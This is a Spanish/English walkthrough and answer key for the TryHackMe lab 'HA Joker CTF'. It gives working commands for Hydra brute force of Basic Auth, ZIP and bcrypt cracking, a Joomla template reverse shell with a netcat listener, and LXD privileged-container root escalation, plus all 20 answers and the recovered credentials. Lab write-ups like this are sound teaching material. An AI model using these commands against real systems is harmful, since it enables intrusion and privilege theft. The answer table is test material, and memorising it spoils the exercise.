# HA Joker CTF
| **Dificultad** | Medium |
| **Tipo** | Boot2Root (Linux) |
| **Slug** | `hajokerctf` |
| **Link** | [TryHackMe](https://tryhackme.com/room/hajokerctf) |
| **Sección** | 02 Level Medium |
| **Fuente** | Web (TryHackMe room `hajokerctf` + walkthroughs públicos: aldeid, Voker2311, Yoel Orit, sckull) |
| **Componentes** | Apache httpd 2.4.29, HTTP Basic Auth, **Joomla** (CMS), gobuster, Hydra, `robots.txt`, backup ZIP, `zip2john` + John the Ripper (PKZIP y bcrypt), PHP reverse shell en plantilla `error.php`, **LXD/LXC privilege escalation** |
| **Impacto** | Cadena completa de pentest web + escalada local: enumeración de servicios, *bruteforce* de Basic Auth, cracking de un ZIP y de un hash bcrypt de administrador de Joomla, RCE mediante plantilla, y **escalada a root abusando del grupo `lxd`** para montar el sistema de ficheros del host en un contenedor privilegiado y leer `/root/final.txt`. |
---
**Contexto:** HA Joker CTF es una room media de temática Joker/Batman que combina enumeración web, *bruteforce* y escalada local. Se descubren los puertos 22, 80 (Apache 2.4.29) y 8080 (Joomla protegido con **Basic Auth**); se enumeran ficheros (`secret.txt`, `phpinfo.php`), se fuerza la autenticación básica (`joker:hannah`), se localiza un `backup.zip` protegido con contraseña que se crackea para restaurar/inspeccionar la base de datos de Joomla, se obtiene la contraseña del usuario `admin` (bcrypt) y se consigue RCE editando una plantilla. Finalmente, el usuario `www-data` pertenece al grupo **`lxd`**, lo que permite montar el sistema de ficheros del host en un contenedor privilegiado y leer el flag de root.
*EN: HA Joker CTF is a medium Joker/Batman-themed room combining web enumeration, brute force and local escalation. Ports 22, 80 (Apache 2.4.29) and 8080 (Joomla behind Basic Auth) are found; files are enumerated (`secret.txt`, `phpinfo.php`), Basic Auth is brute-forced (`joker:hannah`), a password-protected `backup.zip` is cracked to inspect the Joomla database, the `admin` bcrypt password is recovered and RCE is achieved by editing a template. Finally, `www-data` belongs to the **`lxd`** group, allowing the host filesystem to be mounted in a privileged container to read the root flag.*
## Solucionario
### Task 1: HA Joker CTF
**Explicación:** La room es una única tarea con las 20 preguntas. La resolución sigue 5 fases.

The room is a single task with all 20 questions. Resolution follows 5 phases.

#### 1. Enumerate Services (Nmap)
```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))   # _http-title: HA: Joker
8080/tcp open  http    Apache httpd 2.4.29
| http-auth:
| HTTP/1.1 401 Unauthorized        Basic realm=Please enter the password.
```
El puerto **80** no requiere autenticación; el **8080** está protegido por **Basic Authentication**.

#### 2. Bruteforce
Enumeración de ficheros en el puerto 80:
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/common.txt -x txt,php,html
# /phpinfo.php (200)  /secret.txt (200)
```
Contenido de `secret.txt`:
```text
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```
El texto apunta al usuario **`joker`**. Se fuerza la Basic Auth del 8080 con Hydra:
```bash
hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 <IP> http-get
# [8080][http-get] host: <IP>  login: joker  password: hannah
```

#### 3. Hash Crack
Con `joker:hannah` se enumera el 8080 (Joomla). El `robots.txt` revela `/administrator/`. Buscando backups autenticados:
```bash
gobuster dir -U joker -P hannah -u http://<IP>:8080/ -x bak,old,tar,gz,tgz,zip,7z -w /usr/share/wordlists/common.txt
# /backup.zip (200)
```
`backup.zip` está cifrado; se crackea su contraseña:
```bash
wget --user=joker --password=hannah http://<IP>:8080/backup.zip
zip2john backup.zip > backup.hash
john backup.hash            # hannah  (backup.zip)
```
El ZIP contiene `db/` y `site/`. En `site/configuration.php` aparecen credenciales de base de datos y en `db/joomladb.sql` la tabla de usuarios:
```php
public $user = 'joomla';
public $password = '1234';
public $db = 'joomladb';
public $dbprefix = 'cc1gr_';
```
```text
INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','...','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',...);
```
El "Super Duper User" es **`admin`**. Se crackea su hash **bcrypt**:
```bash
john admin.hash --wordlist=/usr/share/wordlists/rockyou.txt
# abcd1234  (?)
```

#### 4. Exploitation (Joomla RCE → www-data)
Con `admin:abcd1234` se entra al panel de Joomla. Se edita la plantilla **Beez3 → error.php** y se sustituye por una **PHP reverse shell**:
```text
http://<IP>:8080/templates/beez3/error.php
```
```bash
rlwrap nc -nlvp 4444
# uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```
Se obtiene shell como **`www-data`**, que pertenece al grupo **`lxd`**. Se spawna una TTY:
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"   # o: SHELL=/bin/bash script -q /dev/null
```

#### 5. Privilege Escalation (LXD)
El grupo `lxd` es un vector conocido de escalada. Se sigue la documentación de **LXD/LXC** (linuxcontainers.org) y, si no hay imagen, se construye/importa una (`lxd-alpine-builder` → `myalpine`):
```bash
lxc image list                # ALIAS de la imagen: myalpine
lxc init myalpine joker -c security.privileged=true
lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true
lxc start joker
lxc exec joker /bin/sh
# ~ # id
# uid=0(root) gid=0(root)
```
En el contenedor privilegiado con el sistema de ficheros del host montado en `/mnt/root`, se accede a `/root` y se lee el flag: **`final.txt`**.
*EN: Full chain: nmap enumeration; gobuster on port 80 finds secret.txt/phpinfo.php; Hydra brute-forces Basic Auth (joker:hannah) on 8080; robots.txt exposes /administrator/; authenticated gobuster finds backup.zip; zip2john+john crack the ZIP (hannah); configuration.php/joomladb.sql reveal the admin bcrypt hash, cracked to abcd1234; Joomla template error.php is replaced with a reverse shell (www-data/lxd); LXD is abused with a privileged container mounting the host filesystem to reach /root and read final.txt.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Enumerate services on lab machine. | `No answer needed` |
| 2 | What version of Apache is it? | `2.4.29` |
| 3 | What port on this machine not need to be authenticated by user and password? | `80` |
| 4 | There is a file on this port that seems to be secret, what is it? | `secret.txt` |
| 5 | There is another file which reveals information of the backend, what is it? | `phpinfo.php` |
| 6 | When reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is? | `joker` |
| 7 | What port on this machine need to be authenticated by Basic Authentication Mechanism? | `8080` |
| 8 | At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password? | `hannah` |
| 9 | Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory? | `/administrator/` |
| 10 | We need access to the administration of the site in order to get a shell, there is a backup file, What is this file? | `backup.zip` |
| 11 | We have the backup file and now we should look for some information... But the backup file seems to be encrypted. What is the password? | `hannah` |
| 12 | ...Some tables must have something like user_table! What is the super duper user? | `admin` |
| 13 | Super Duper User! What is the password? | `abcd1234` |
| 14 | At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session? | `www-data` |
| 15 | This user belongs to a group that differs on your own group, What is this group? | `lxd` |
| 16 | Spawn a tty shell. | `No answer needed` |
| 17 | In this question you should be do a basic research on how linux containers (LXD) work... | `No answer needed` |
| 18 | List the image installed on the lxd-service, what is the ALIAS of this image? | `No answer needed` |
| 19 | ...Create the container with the privilege true and mount the root file system on /mnt in order to gain access to /root directory on host machine. | `No answer needed` |
| 20 | What is the name of the file in the /root directory? | `final.txt` |
---
**Metodología:** Enumeración (nmap) → *bruteforce* de ficheros (gobuster) y de Basic Auth (Hydra) → crackeo de ZIP (zip2john/john) → volcado de credenciales y hash bcrypt (configuration.php + joomladb.sql) → crackeo de bcrypt → RCE en Joomla (plantilla `error.php`) → shell `www-data` → spawn de TTY → escalada con **LXD** (contenedor privilegiado montando `/`) → `/root/final.txt`.
**Learning chain:** enumerar servicios → descubrir ficheros y usuarios → forzar/creckear credenciales → identificar CMS → obtener RCE vía plantilla → reconocer grupo privilegiado (`lxd`) → montar el host en un contenedor → leer root.
**Lección:** *La combinación de Basic Auth débil, backups accesibles con credenciales embebidas, hashes bcrypt reciclados y la pertenencia del usuario web al grupo `lxd` permite comprometer por completo el host; el grupo `lxd` es equivalente a privilegios de root.*
**MITRE ATT&CK:** T1046 (Network Service Discovery), T1083 (File and Directory Discovery), T1110.001/.002 (Brute Force: Password Guessing/Cracking), T1552.001 (Credentials In Files), T1505.003 (Web Shell), T1059.004 (Unix Shell), T1548.003 (Sudo and Sudo Caching) — contexto, T1611 (Escape to Host) / T1610 (Deploy Container).
**Fuente:** [TryHackMe - HA Joker CTF](https://tryhackme.com/room/hajokerctf)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
